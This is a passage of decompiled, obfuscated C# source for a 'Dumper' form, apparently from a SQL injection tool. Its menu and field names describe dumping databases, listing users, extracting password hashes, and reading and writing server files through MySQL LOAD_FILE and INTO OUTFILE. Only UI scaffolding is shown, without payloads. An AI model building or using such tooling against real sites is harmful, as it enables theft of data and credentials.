using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using DataBase;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns0;
using Taskbar;

[DesignerGenerated]
public class Dumper : Form
{
	public enum enHTTPMethod
	{
		GET,
		POST
	}

	private enum Enum4 : byte
	{
		const_0,
		const_1,
		const_2,
		const_3,
		const_4,
		const_5,
		const_6,
		const_7
	}

	internal enum Enum5 : byte
	{
		const_0,
		const_1,
		const_2,
		const_3,
		const_4,
		const_5,
		const_6,
		const_7,
		const_8,
		const_9
	}

	private sealed class Class44
	{
		public Dictionary<int, string> dictionary_0;

		public Dictionary<int, string> dictionary_1;

		public List<string> list_0;

		public List<int> list_1;

		public int int_0;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private int int_1;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private int int_2;

		public int RowsAdded
		{
			[CompilerGenerated]
			get
			{
				return int_1;
			}
			[CompilerGenerated]
			set
			{
				int_1 = value;
			}
		}

		public int AffectedRows
		{
			[CompilerGenerated]
			get
			{
				return int_2;
			}
			[CompilerGenerated]
			set
			{
				int_2 = value;
			}
		}

		public Class44()
		{
			dictionary_0 = new Dictionary<int, string>();
			dictionary_1 = new Dictionary<int, string>();
			list_0 = new List<string>();
			list_1 = new List<int>();
			int_0 = 0;
		}

		public string method_0()
		{
			return string.Format(Globals.translate_0.GetStr(Globals.GMain.DumperForm, 0) + " {0}, " + Globals.translate_0.GetStr(Globals.GMain.DumperForm, 1) + " {1}", dictionary_0.Count, dictionary_1.Count);
		}
	}

	private delegate void Delegate20(string sString);

	private delegate void Delegate21(string sString, string sString2);

	private delegate void Delegate22(string sString, string sString2, string sString3);

	private delegate void Delegate23(string sString, string sString2, string sString3, string sString4);

	private delegate void Delegate24(string sColunm, string sValue, int intIndex);

	private delegate void Delegate25(string sVersion, string sCountry, Image picFLag);

	private delegate int Delegate26(Schema oT, string sDB, string sTable, string sCollumn, string sCount1, string sCount2);

	private delegate int Delegate27(Schema oT, string sDB, string sTable, string sCollumn);

	private sealed class Class45
	{
		public sealed class Class46
		{
			[DebuggerBrowsable(DebuggerBrowsableState.Never)]
			[CompilerGenerated]
			private string string_0;

			[CompilerGenerated]
			[DebuggerBrowsable(DebuggerBrowsableState.Never)]
			private string string_1;

			[CompilerGenerated]
			[DebuggerBrowsable(DebuggerBrowsableState.Never)]
			private List<string> list_0;

			[CompilerGenerated]
			[DebuggerBrowsable(DebuggerBrowsableState.Never)]
			private string string_2;

			public string DataBase
			{
				[CompilerGenerated]
				get
				{
					return string_0;
				}
				[CompilerGenerated]
				set
				{
					string_0 = value;
				}
			}

			public string Table
			{
				[CompilerGenerated]
				get
				{
					return string_1;
				}
				[CompilerGenerated]
				set
				{
					string_1 = value;
				}
			}

			public List<string> Columns
			{
				[CompilerGenerated]
				get
				{
					return list_0;
				}
				[CompilerGenerated]
				set
				{
					list_0 = value;
				}
			}

			public string Query
			{
				[CompilerGenerated]
				get
				{
					return string_2;
				}
				[CompilerGenerated]
				set
				{
					string_2 = value;
				}
			}

			public Class46()
			{
				DataBase = "";
				Table = "";
				Query = "";
				Columns = new List<string>();
			}
		}

		public Dictionary<string, Class46> dictionary_0;

		public Class45()
		{
			dictionary_0 = new Dictionary<string, Class46>();
		}

		public Class46 method_0(int int_0)
		{
			int num = default(int);
			foreach (KeyValuePair<string, Class46> item in dictionary_0)
			{
				if (!num.Equals(int_0))
				{
					num = checked(num + 1);
					continue;
				}
				return dictionary_0[item.Key];
			}
			return null;
		}

		public int method_1()
		{
			return dictionary_0.Count;
		}

		public void method_2(string string_0)
		{
			Class46 @class = new Class46();
			@class.DataBase = string_0;
			dictionary_0.Add(string_0, @class);
		}

		public void method_3(string string_0, string string_1)
		{
			Class46 @class = dictionary_0[string_0];
			@class.Table = string_1;
		}

		public void method_4(string string_0, string string_1, string string_2)
		{
			Class46 @class = dictionary_0[string_0];
			if (!@class.Columns.Contains(string_2))
			{
				@class.Columns.Add(string_2);
			}
		}

		public void method_5(string string_0, string string_1, string string_2)
		{
			Class46 @class = dictionary_0[string_0];
			@class.Query = string_2;
		}
	}

	private sealed class Class47
	{
		private Thread thread_0;

		private int int_0;

		private int int_1;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private int int_2;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private int int_3;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private int int_4;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private int int_5;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private string string_0;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private string string_1;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private List<string> list_0;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private string string_2;

		public int TotalThreads
		{
			[CompilerGenerated]
			get
			{
				return int_2;
			}
			[CompilerGenerated]
			set
			{
				int_2 = value;
			}
		}

		public int TotalJob
		{
			[CompilerGenerated]
			get
			{
				return int_3;
			}
			[CompilerGenerated]
			set
			{
				int_3 = value;
			}
		}

		public int IndexJob
		{
			[CompilerGenerated]
			get
			{
				return int_4;
			}
			[CompilerGenerated]
			set
			{
				int_4 = value;
			}
		}

		public int AfectedRows
		{
			[CompilerGenerated]
			get
			{
				return int_5;
			}
			[CompilerGenerated]
			set
			{
				int_5 = value;
			}
		}

		public string DataBase
		{
			[CompilerGenerated]
			get
			{
				return string_0;
			}
			[CompilerGenerated]
			set
			{
				string_0 = value;
			}
		}

		public string Table
		{
			[CompilerGenerated]
			get
			{
				return string_1;
			}
			[CompilerGenerated]
			set
			{
				string_1 = value;
			}
		}

		public List<string> Columns
		{
			[CompilerGenerated]
			get
			{
				return list_0;
			}
			[CompilerGenerated]
			set
			{
				list_0 = value;
			}
		}

		public string Err
		{
			[CompilerGenerated]
			get
			{
				return string_2;
			}
			[CompilerGenerated]
			set
			{
				string_2 = value;
			}
		}

		public Thread Thread_0 => thread_0;

		public int Int32_0 => int_0;

		public int Int32_1 => int_1;

		public Class47(Thread thread_1, int int_6, int int_7)
		{
			int_0 = -1;
			int_1 = 0;
			thread_0 = thread_1;
			int_0 = int_6;
			int_1 = int_7;
			IndexJob = -1;
		}
	}

	private delegate void Delegate28(int iTColumns);

	private delegate void Delegate29(List<string> lRow);

	private delegate void Delegate30(int index, string value);

	public struct TVITEM
	{
		public int mask;

		public IntPtr hItem;

		public int state;

		public int stateMask;

		[MarshalAs(UnmanagedType.LPTStr)]
		public string lpszText;

		public int cchTextMax;

		public int iImage;

		public int iSelectedImage;

		public int cChildren;

		public IntPtr lParam;
	}

	public class TreeNodeComparer : IComparer<TreeNode>
	{
		public int Compare(TreeNode x, TreeNode y)
		{
			if (x == null)
			{
				if (y == null)
				{
					return 0;
				}
				return -1;
			}
			if (y == null)
			{
				return 1;
			}
			return string.CompareOrdinal(x.Text, y.Text);
		}
	}

	private IContainer icontainer_0;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("tsbSchemas_0")]
	[CompilerGenerated]
	private ToolStripButton _tsbSchemas_0;

	[CompilerGenerated]
	[AccessedThroughProperty("tsbSchemas_1")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripButton _tsbSchemas_1;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("tsbSchemas_2")]
	private ToolStripButton _tsbSchemas_2;

	[AccessedThroughProperty("btnServerInfo")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripButton _btnServerInfo;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("tsbSchemas_3")]
	private ToolStripButton _tsbSchemas_3;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("trwSchema")]
	[CompilerGenerated]
	private TreeViewExt _trwSchema;

	[AccessedThroughProperty("btnFiltersClear1")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripButton _btnFiltersClear1;

	[AccessedThroughProperty("btnClearSchema")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripButton _btnClearSchema;

	[CompilerGenerated]
	[AccessedThroughProperty("btnDataBases")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripButton _btnDataBases;

	[CompilerGenerated]
	[AccessedThroughProperty("btnTables")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripButton _btnTables;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("btnColumns")]
	private ToolStripButton _btnColumns;

	[CompilerGenerated]
	[AccessedThroughProperty("btnDumpData")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripButton _btnDumpData;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("btnColumnUp")]
	private ToolStripButton _btnColumnUp;

	[AccessedThroughProperty("btnColumnDown")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripButton _btnColumnDown;

	[CompilerGenerated]
	[AccessedThroughProperty("txtCustomQueryFrom")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private TextBox _txtCustomQueryFrom;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("btnDumpCustom")]
	private ToolStripButton _btnDumpCustom;

	[AccessedThroughProperty("btnDefCustomQuery")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripButton _btnDefCustomQuery;

	[CompilerGenerated]
	[AccessedThroughProperty("chkMSSQLCastAsChar")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private CheckBox _chkMSSQLCastAsChar;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("mnuPostgreSQL_ListUsers")]
	private ToolStripMenuItem _mnuPostgreSQL_ListUsers;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mnuPostgreSQL_Passwords")]
	private ToolStripMenuItem _mnuPostgreSQL_Passwords;

	[AccessedThroughProperty("mnuPostgreSQL_Join")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _mnuPostgreSQL_Join;

	[AccessedThroughProperty("mnuOracleListUsers")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _mnuOracleListUsers;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mnuOracleHashes")]
	[CompilerGenerated]
	private ToolStripMenuItem _mnuOracleHashes;

	[AccessedThroughProperty("mnuOracleJoin")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _mnuOracleJoin;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mnuOracleHelp")]
	private ToolStripMenuItem _mnuOracleHelp;

	[AccessedThroughProperty("mnuSqlLogins")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _mnuSqlLogins;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mnuSqlIsAdmin")]
	[CompilerGenerated]
	private ToolStripMenuItem _mnuSqlIsAdmin;

	[AccessedThroughProperty("mnuSQLJoin")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _mnuSQLJoin;

	[CompilerGenerated]
	[AccessedThroughProperty("mnuSQLHelp")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _mnuSQLHelp;

	[AccessedThroughProperty("bckWorker")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private BackgroundWorker backgroundWorker_0;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("tlpUrl")]
	private ToolTip toolTip_0;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("mnuFilters1")]
	private ToolStripMenuItem _mnuFilters1;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("mnuFilters2")]
	private ToolStripMenuItem _mnuFilters2;

	[AccessedThroughProperty("mnuFilters5")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _mnuFilters5;

	[AccessedThroughProperty("mnuFilters6")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _mnuFilters6;

	[AccessedThroughProperty("mnuFilters7")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _mnuFilters7;

	[CompilerGenerated]
	[AccessedThroughProperty("mnuFilters8")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _mnuFilters8;

	[AccessedThroughProperty("mnuFilters9")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _mnuFilters9;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("mnuFilters10")]
	private ToolStripMenuItem _mnuFilters10;

	[CompilerGenerated]
	[AccessedThroughProperty("mnuFilters3")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _mnuFilters3;

	[AccessedThroughProperty("ctmSchema")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ContextMenuStrip _mnuListView_2;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("bckAlexa")]
	[CompilerGenerated]
	private BackgroundWorker backgroundWorker_1;

	[CompilerGenerated]
	[AccessedThroughProperty("mnuUsers")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _mnuUsers;

	[AccessedThroughProperty("mnuPrivileges")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _mnuPrivileges;

	[AccessedThroughProperty("mnuListDBA")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _mnuListDBA;

	[CompilerGenerated]
	[AccessedThroughProperty("mnuHostIP")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _mnuHostIP;

	[AccessedThroughProperty("mnuExtraMySQLStuffs2")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _mnuExtraMySQLStuffs2;

	[AccessedThroughProperty("mnuLoadFile")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _mnuLoadFile;

	[CompilerGenerated]
	[AccessedThroughProperty("mnuIntoOutfile")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _mnuIntoOutfile;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mnuIntoDumpfile")]
	private ToolStripMenuItem _mnuIntoDumpfile;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mnuExtraMySQLStuffs")]
	private ToolStripMenuItem _mnuExtraMySQLStuffs;

	[AccessedThroughProperty("mnuCheckUser")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _mnuCheckUser;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mnuCheckPizza")]
	private ToolStripMenuItem _mnuCheckPizza;

	[AccessedThroughProperty("mnuJOIN")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _mnuJOIN;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("mnuLENGTH")]
	private ToolStripMenuItem _mnuLENGTH;

	[AccessedThroughProperty("mnuLimitXY")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _mnuLimitXY;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mnuMySQLHelp")]
	[CompilerGenerated]
	private ToolStripMenuItem _mnuMySQLHelp;

	[AccessedThroughProperty("ctmConvert")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ContextMenuStrip _mnuListView_1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mnuConvHex")]
	private ToolStripMenuItem _mnuConvHex;

	[CompilerGenerated]
	[AccessedThroughProperty("mnuConvChar")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _mnuConvChar;

	[AccessedThroughProperty("mnuConvCharGroup")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _mnuConvCharGroup;

	[AccessedThroughProperty("mnuConvLEN")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _mnuConvLEN;

	[AccessedThroughProperty("mnuConvAddA")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _mnuConvAddA;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("imgTV")]
	private ImageList imageList_0;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("mnuTree")]
	private ContextMenuStrip _mnuListView;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mnuCountDBs")]
	[CompilerGenerated]
	private ToolStripMenuItem _mnuCountDBs;

	[AccessedThroughProperty("mnuCountTables")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _mnuCountTables;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mnuCountTablesAll")]
	[CompilerGenerated]
	private ToolStripMenuItem _mnuCountTablesAll;

	[AccessedThroughProperty("mnuCountColumns")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _mnuCountColumns;

	[AccessedThroughProperty("mnuCountColumnsAll")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _mnuCountColumnsAll;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mnuCountRows")]
	private ToolStripMenuItem _mnuCountRows;

	[CompilerGenerated]
	[AccessedThroughProperty("mnuCountRowsAll")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _mnuCountRowsAll;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mnuCopyDB")]
	[CompilerGenerated]
	private ToolStripMenuItem _mnuCopyDB;

	[AccessedThroughProperty("mnuCopyColumn")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _mnuCopyColumn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mnuCopyTable")]
	private ToolStripMenuItem _mnuCopyTable;

	[AccessedThroughProperty("mnuCheckAllColumns")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _mnuCheckAllColumns;

	[CompilerGenerated]
	[AccessedThroughProperty("mnuUnCheckAllColumns")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _mnuUnCheckAllColumns;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("mnuCheckRevert")]
	private ToolStripMenuItem _mnuCheckRevert;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("mnuCopyAllNodes")]
	private ToolStripMenuItem _mnuCopyAllNodes;

	[AccessedThroughProperty("mnuCopyAllSchema")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _mnuCopyAllSchema;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mnuClearNodes")]
	[CompilerGenerated]
	private ToolStripMenuItem _mnuClearNodes;

	[CompilerGenerated]
	[AccessedThroughProperty("mnuClearSchema")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _mnuClearSchema;

	[AccessedThroughProperty("mnuRemDB")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _mnuRemDB;

	[CompilerGenerated]
	[AccessedThroughProperty("mnuRemTable")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _mnuRemTable;

	[CompilerGenerated]
	[AccessedThroughProperty("mnuRemColumn")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _mnuRemColumn;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mnuAddDB")]
	[CompilerGenerated]
	private ToolStripMenuItem _mnuAddDB;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mnuAddTable")]
	private ToolStripMenuItem _mnuAddTable;

	[AccessedThroughProperty("mnuAddColumn")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _mnuAddColumn;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("mnuCollapseTree")]
	private ToolStripMenuItem _mnuCollapseTree;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("mnuSortTree")]
	private ToolStripMenuItem _mnuSortTree;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mnuAutoScroll")]
	[CompilerGenerated]
	private ToolStripMenuItem _mnuAutoScroll;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("txtMySQLWriteFile")]
	private TextBox _txtMySQLWriteFile;

	[AccessedThroughProperty("txtMySQLReadFilePath")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripTextBox _txtMySQLReadFilePath;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("btnMySQLReadFile")]
	private ToolStripButton _btnMySQLReadFile;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("txtMySQLWriteFilePath")]
	private ToolStripTextBox _txtMySQLWriteFilePath;

	[AccessedThroughProperty("btnMySQLWriteFile")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripButton _btnMySQLWriteFile;

	[AccessedThroughProperty("tlsMenu")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStrip _tlsMenu;

	[AccessedThroughProperty("btnPasteURL")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripButton _btnPasteURL;

	[AccessedThroughProperty("cmbSqlType")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripComboBox _cmbSqlType;

	[AccessedThroughProperty("numLimitMax")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private NumericUpDown _numLimitMax;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("chkDumpWhere")]
	private CheckBox _chkDumpWhere;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("chkDumpOrderBy")]
	[CompilerGenerated]
	private CheckBox _chkDumpOrderBy;

	[AccessedThroughProperty("chkDumpFieldByField")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private CheckBox _chkDumpFieldByField;

	[CompilerGenerated]
	[AccessedThroughProperty("txtUserName")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private TextBox _txtUserName;

	[AccessedThroughProperty("txtPassword")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private TextBox _txtPassword;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("btnLoadDefautSettings")]
	private ToolStripButton _btnLoadDefautSettings;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("btnLoadNewDumper")]
	private ToolStripButton _btnLoadNewDumper;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("imlTabs")]
	private ImageList imageList_1;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("chkMySQLSplitRows")]
	private CheckBox _chkMySQLSplitRows;

	[AccessedThroughProperty("btnSearchColumn")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripButton _btnSearchColumn;

	[AccessedThroughProperty("txtSearchColumn")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripComboBox _txtSearchColumn;

	private static bool bool_0;

	private static bool bool_1;

	private bool bool_2;

	private DumpLoading dumpLoading_0;

	private Enum5 enum5_0;

	private Class44 class44_0;

	private Class45 class45_0;

	private string string_0;

	private bool bool_3;

	private ThreadPool threadPool_0;

	private Types types_0;

	private Enum4 enum4_0;

	private List<string> list_0;

	private string string_1;

	private static char char_0;

	private static int int_0;

	private string string_2;

	private string string_3;

	private string string_4;

	private static char char_1;

	private List<DumpGrid> list_1;

	private DumpGrid dumpGrid_0;

	private bool bool_4;

	private AppDomainControl appDomainControl_0;

	private string string_5;

	private string string_6;

	private int int_1;

	private int int_2;

	private bool bool_5;

	internal TabControlExt tabControlExt_0;

	public static int TVIF_STATE;

	public static int TVIS_STATEIMAGEMASK;

	public static int TV_FIRST;

	public static int TVM_SETITEM;

	private static string string_7;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("txtURL")]
	private ToolStripSpringTextBox toolStripSpringTextBox_0;

	private string string_8;

	[SpecialName]
	private DateTime _0024STATIC_0024CheckRequestDelay_002420118_0024LastRequestDelay;

	[SpecialName]
	private StaticLocalInitFlag _0024STATIC_0024CheckRequestDelay_002420118_0024LastRequestDelay_0024Init;

	[SpecialName]
	private string _0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sSelect;

	[SpecialName]
	private StaticLocalInitFlag _0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sSelect_0024Init;

	[SpecialName]
	private string _0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sFrom;

	[SpecialName]
	private StaticLocalInitFlag _0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sFrom_0024Init;

	[SpecialName]
	private string _0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sQuery;

	[SpecialName]
	private StaticLocalInitFlag _0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sQuery_0024Init;

	[SpecialName]
	private string _0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sQuery2;

	[SpecialName]
	private StaticLocalInitFlag _0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sQuery2_0024Init;

	[SpecialName]
	private string _0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sQuery3;

	[SpecialName]
	private StaticLocalInitFlag _0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sQuery3_0024Init;

	[field: AccessedThroughProperty("tsGetInfo")]
	internal virtual ToolStrip tsGetInfo
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("tscSchemas")]
	internal virtual ToolStripComboBox tscSchemas
	{
